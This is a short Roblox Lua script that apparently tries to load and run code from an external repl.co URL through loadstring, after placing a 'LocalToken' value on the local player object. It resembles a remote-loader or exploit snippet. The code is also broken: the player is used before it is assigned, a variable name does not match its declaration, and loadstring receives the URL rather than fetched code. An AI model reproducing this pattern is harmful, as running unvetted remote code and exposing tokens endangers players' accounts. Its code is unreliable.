repeat wait() until game.Players.LocalPlayer --Wait until player loaded

--Locals
local sa_Instance
local player
local ip

--Assign
ip = "https://mrbombastic.starvdog.repl.co"
sa_instance = Instance.new("StringValue")
sa_instance.Value = LocalToken
sa_instance.Parent = player
player = game.Players.LocalPlayer

--Connect
loadstring(ip)
